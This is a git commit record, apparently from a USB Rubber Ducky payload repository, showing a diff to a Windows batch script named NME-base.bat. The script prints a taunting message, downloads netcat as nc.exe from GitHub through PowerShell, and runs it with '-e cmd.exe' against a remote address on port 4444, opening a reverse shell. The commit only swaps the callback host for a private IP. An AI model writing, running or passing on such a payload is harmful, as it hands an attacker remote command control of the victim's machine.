339741fca988a45406eb5db15a82a74d67fcc204
carlos gemmell <aquaktus@yahoo.co.uk>
2017-02-06 11:12:21 +0000

    Update NME-base.bat

--- NME-base.bat
+++ NME-base.bat
@@ -1,4 +1,4 @@
 @echo off
 echo NME has you.....
 powershell -Command "& wget 'https://github.com/aquaktus/ducky-payload/blob/master/nc.txt?raw=true' -UseBasicParsing -O nc.exe"
-nc -nv http://aquaktus.pythonanywhere.com/ 4444 -e cmd.exe
+nc -nv 172.30.180.46 4444 -e cmd.exe
